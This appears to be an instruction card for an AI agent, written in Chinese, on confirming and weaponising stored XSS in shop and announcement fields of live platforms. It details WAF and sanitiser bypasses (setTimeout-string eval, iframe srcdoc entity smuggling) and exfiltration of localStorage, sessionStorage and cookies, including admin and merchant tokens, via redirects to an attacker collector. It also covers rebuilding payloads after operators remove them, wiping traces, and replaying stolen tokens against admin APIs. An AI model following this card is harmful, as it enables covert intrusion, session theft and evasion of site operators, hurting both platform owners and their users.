---
name: payload-execution-verification
description: Use when 载荷过 WAF/落库后要证明真会执行(存储型 XSS/HTML 注入). 三证+浏览器自证+外带回路。
---

# payload-execution-verification（载荷执行三证与武器化）

适用：你把一段 HTML/JS 写进了目标（公告/弹窗/备注/昵称/店铺描述/客服消息），服务端回了「保存成功」。
**服务端接受 ≠ WAF 放行 ≠ 浏览器执行** —— 三件独立的事，必须分别取证。
本卡管「证明真执行并取回数据」；不管找洞（找洞走 `xss-exploit`）。

## 铁律

1. **过 WAF 且落库 ≠ 会执行。** WAF 匹配文本模式，浏览器按 HTML 解析规则另行裁决。
   ⇒ 上线前必须本地自证 fire，上线后必须收集器实收数据；只看到 `code:1`/「保存成功」不算。
2. **属性形态先探，别预设「零空格」。** 无引号属性值在首个空白处截断 ⇒ 写在无引号 `onerror=` 里的 JS 必须零空格
   （`var o={`、`function ()` 这类自带空格的写法当场作废，静默不执行）；但**斜杠分隔 + 引号包裹值**
   （`<img/onerror="…" src=q>`）可正常写带空格的 JS。引号型是否被 WAF 拦**必须本次实测**，旧结论不可复用。
3. **只有「属性前置」才敢用 `/` 分隔。** `<img/src=x/onerror=…>` 里 `/` 被吞进未加引号的 `src` 值
   ⇒ 浏览器**永不生成 `onerror` 属性**（典型假阳性）。要么属性前置 `<img/onerror=… src=x>`，要么给前属性加引号。
4. **外带走顶层导航。** HTTPS 页面上的 `fetch`/`new Image()` 打 `http://` 收集器会被 mixed content 拦死。
   通道按放行度选：`setTimeout` 字符串里做 `location='http://…?d='+s`（见铁律 8）>
   `<form action=http://… method=get><input name=d id=d>` + `z.submit()` > 锚点 `click()`。
   ⚠ `location.href=…` / `assign` / `replace` / `encodeURIComponent(`（以及任何「导航 sink 接动态数据」写法）
   在语义型 WAF 上**被拦**，别用旧写法。
5. **收集器收到即 302 弹回原页**，受害者只见一次闪烁；频率标记 key 带内容哈希
   （`<feature>_<shop>_<contentHash>`）⇒ 每条只触发一次、不死循环，换内容即对所有人重新武装。
   上线前必须把频率/去重逻辑读掉，否则公告→跳转→弹回→公告 = 死循环。
6. **用完清理。** 测试标记、以及**落库的无效残留**（不执行的假阳性载荷）都要清空/还原——用户要求无痕。
7. **WAF 分两层：属性形态 + 语义规则，后者才是真闸门。** 语义型 WAF 拦「导航 sink 接动态数据」
   （`location=<非字面量>`，模板字符串 `${}` 也算）、`document.cookie` 参与外带、`X['字面键']`、`getItem(`、
   `Object.keys/entries`、`eval(`/`atob(`；放行裸读入变量（`s=localStorage[k]`）、`location='<字面量>'`、
   `d.value=<变量>`、`z.submit()`/`z.click()`、纯 HTML 表单注入。
   ⇒ 先探放行面再拼真实动作，一发一条、单变量差分，别把整条链路上送。
8. **★ 字符串字面量是语义 WAF 的盲区 —— `setTimeout('<code>',0)` 就是隐式 eval 通道。**
   遍历/拼接/动态导航/cookie 全写进字符串参数即可整体放行；唯有 `eval(`/`atob(` 是平铺 token 规则、
   字符串内照样拦。定型形态 `<img/onerror="setTimeout('…',0)" src=q>`，JS 内单引号一律写 `\x27`
   （HTML 属性不解码反斜杠，原样进库再被 JS 解析）。
   定性判据：同一段热内容**裸写被拦、包进字符串放行** ⇒ 盲区成立；反例锚点 `setTimeout('x=eval(1)',0)` 仍拦。
9. **引导是人环。** 把带毒页送达到持票者属社会动作，先给方案让用户拍板，不擅自对外发消息。
10. **先给服务端清洗器指纹化，再改载荷形态。** 唯一手段是落库后**逐字节回读**并与原文 diff，逐条列出「被删片段 / 被改写片段」；看到 `code:1` 只说明写入成功。
   已实测的一族规则（国产发卡/商城类平台清洗链）：①`<script>…</script>` **整体剥除**（属性留空串、内容删）②`on<字母>` 的 `o` 换成希腊 `ο`(U+03BF) ⇒ **所有 `on*` 静默作废**，视觉不可辨 ⇒ 回读必须按码点查（`\u03bf`），肉眼比对必然漏判 ③**属性型载体存活**。
   ⇒ 结论：过滤只认**字面 token**，不认实体与属性语义 ⇒ 走**实体编码走私**：`<iframe srcdoc='&lt;script&gt;…&lt;/script&gt;'>` 存库不含字面量 `script`（过清洗），浏览器解析 `srcdoc` 时**解码实体** ⇒ 内部脚本执行、且 iframe 同源、可读写 `parent`。
11. **载体被运营方删掉要重建，不要收线。** 自己写的对象被清理（读接口全空、回收站也空）时，若没有 create/add 端点，就用**保存/更新端点带不存在（或不带）的 id 当 INSERT**，必填字段靠**错误阶梯**反推：`XX未选择` = 值不合法 → 建前置对象拿真 id；`HTTP 500`/框架错误页 = 还缺必填（如 `goods_key`）或类型错（枚举常是字符串 `"card"` 而非 `1`，关联信息常是嵌套对象）；返回体里带新 `id`/`key` 即建成。字段结构不要猜，拷一个同类型真实对象的 keys/JSON 当模板。
12. **同一条 body 的 WAF 判定含启发式：一次 403 不等于打法判死。** 实测同一 chunked body 一发被 403、下一发直达 app；非 chunked 含字面量 `script` 稳定 403 ⇒ 规则是「先换 framing（chunked）重试，再换形态」，不是一发失败就写结论。

## 三证流程（按序，缺一条不能说打通）

### 证一 数据层零过滤
- 先写无害标记（如 `<b>XMARK</b>`），再调读接口取回，与原文**逐字比对**（`stored == sent`）。
- 字段名写错时服务端常**静默忽略但仍回「保存成功」** ⇒ 一律回读取值，不看返回码。
- **写接口回了新对象 id、而你自己的读路径全说「不存在」= 待审核态，是正向证据。** 删除/隐藏类接口对你的读路径生效但对象仍在平台侧队列里（管理员可见）⇒ **判据取写入响应里的 id**（`data:{id,key}`），不要用自己的 list/info 回空反推「没建成」，那会把自己已经递到管理员面前的东西判成失败。

### 证二 渲染层零转义
- 取**渲染它的那份 JS**：打包站用 base64 名静态文件（如 `/plugin/<code>/static/<base64>.js`），
  往往以匿名访客身份就能下载。`grep -n "innerHTML\|textContent" <file>` 并打印上下文（<50 行）。
- 要看到 `el.innerHTML = \`…${content}…\`` 这类模板串插值；看到 `textContent` 就等于没洞，收线。

- **先定准是哪份 chunk。** SPA 生产构建按路由懒加载分块，字段的渲染代码在**该页自己的 chunk**（路由/组件对应的 `assets/index.<hash>.js`）；入口 bundle 里根本没有 ⇒ 在入口包里 grep 不到不能当结论，先拿路由/页面清单定位 chunk。
- **`v-html` 字面量在产物里为 0 ≠ 没洞**（编译成 `innerHTML`/domProps）；反过来 **chunk 里出现 `innerHTML` 也不等于该字段走 HTML**——可能是不相干的 helper（如 SVG loader）⇒ 必须定位到**该字段名附近**的绑定才下结论。
- 字段只做文本绑定（`class`/文本插值/`textContent`）⇒ **存储型 XSS 判否并收线**：落库成功与浏览器执行是两件事，别把「已入库」写成「可执行」。

### 证三 执行层
1. **本地自证（零请求，先做）**：把载荷写成 `onerror=window.__x=1`，在任一正常 origin 页面
   `document.body.innerHTML = PAYLOAD`，再读 `window.__x`。
   （`about:blank`/`file://` 下 localStorage 不可用，要试 `localStorage` 得用真 http 页。）
   - **嵌套上下文里一切读写都打在 `parent` 上。** 载荷若在 iframe（含 `srcdoc`）内执行，`window` 就是 iframe 自己的 ⇒ 写 `window.__x`／读 `localStorage` 会得到 0／空，**误判为「载荷不执行」**；必须写 `parent.__x` 并从外层读、`parent.fetch`/`parent.localStorage` 才是真实落点。
   回读 DOM 若见 `onerror`/`onload` 被吞进前一个属性值里 ⇒ 假阳性，换形态。
   - **含转义序列的载荷必须用 `<script type="text/plain" id=src>` + `.textContent` 取原文再 `innerHTML`**：
     把载荷嵌进普通 JS 字符串字面量会让 `\x27` 在这一层就被解码、载荷被改坏，自证结论作废。
   - 上线后用**读回的落库字节**重跑同一自证（复刻真实入口 `el.innerHTML = \`…${content}…\`` 的写法），三轴才算齐。
2. **过 WAF + 落库 + 逐字回读**（三证一的比对）。
3. **收集器实收**：拿到 `localStorage` 全量（同源票如 `admin-token`/`merchant_token` 就在里面）、
   `sessionStorage`、`document.cookie`、`location`、`referrer`，才算端到端闭环。

## 外带与接收端

- 收集器可以留在 HTTP（顶层导航不受 mixed content 限制）；HTTPS 收集器当然更好，但不必要。
- 收集器自建在跳板机：自包含脚本把 daemon 源码写盘后 `Popen(..., start_new_session=True)` 起后台
  （前台服务会挂住会话）；**换新端口起新版，不要 kill 老进程**；
  可达性必须从**另一台**机器 curl 一次公网 IP 才算验证（只测 `127.0.0.1` 不算）。
- 拿到票立刻拿它去打后台 API 验活（`checkToken` 类端点）——票可能随登录失效，早用。

## 配套

- 载荷形态矩阵 × 宝塔 WAF 实测 × 收集器/自证片段：`references/waf-bypass-payloads-and-collectors.md`
- 清洗器指纹化 × 实体编码走私 × 属性型载体 × 载体生命周期：`references/html-sanitizer-fingerprint-and-carrier-bypass.md`
- 找洞与完整利用链：`xss-exploit`
